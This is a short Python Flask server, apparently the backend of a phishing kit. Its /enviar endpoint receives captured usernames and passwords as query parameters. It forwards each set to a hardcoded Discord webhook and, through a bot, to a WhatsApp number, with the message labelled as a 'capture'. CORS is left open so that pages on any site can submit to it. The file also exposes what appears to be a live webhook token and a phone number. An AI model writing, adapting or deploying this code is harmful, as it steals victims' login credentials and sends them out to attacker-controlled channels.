import os
import threading
import requests
from flask import Flask, request
from flask_cors import CORS
from whatsapp_web_api import iniciar_bot, enviar_mensaje

WEBHOOK_URL = "https://discord.com/api/webhooks/1379160851432341695/xya9f3wHLQIfu6n7Fw8Lp70xrFHlbBDXTXNrdqVGzK98mZTZpV1AO18cLuISiWgwoP7L"  # tu webhook real
NUMERO_DESTINO = "51949760700"  # número destino en formato internacional

app = Flask(__name__)
CORS(app)

def enviar_a_discord(nombre, passwd, hora):
    mensaje = {
        "content": f"""Nombre: {nombre}
Pass: {passwd}
Hora: {hora}"""
    }
    try:
        resp = requests.post(WEBHOOK_URL, json=mensaje)
        return resp.status_code in (200, 204)
    except Exception as e:
        print("❌ Error Discord:", str(e))
        return False

@app.route("/enviar", methods=["GET"])
def enviar():
    nombre = request.args.get("NOMBRE", "")
    passwd = request.args.get("PASS", "")
    hora   = request.args.get("HORA", "")

    ok_discord = enviar_a_discord(nombre, passwd, hora)

    mensaje_whatsapp = f"📦 Captura recibida\n👤 Nombre: {nombre}\n🔑 Pass: {passwd}\n⏰ Hora: {hora}"
    ok_whatsapp = enviar_mensaje(NUMERO_DESTINO, mensaje_whatsapp)

    return {
        "discord": ok_discord,
        "whatsapp": ok_whatsapp
    }, 200 if ok_discord and ok_whatsapp else 500

if __name__ == "__main__":
    # Inicializa el bot de WhatsApp en un hilo aparte
    threading.Thread(target=iniciar_bot).start()

    # Ejecuta la API en el puerto 3000
    app.run(host="0.0.0.0", port=3000)
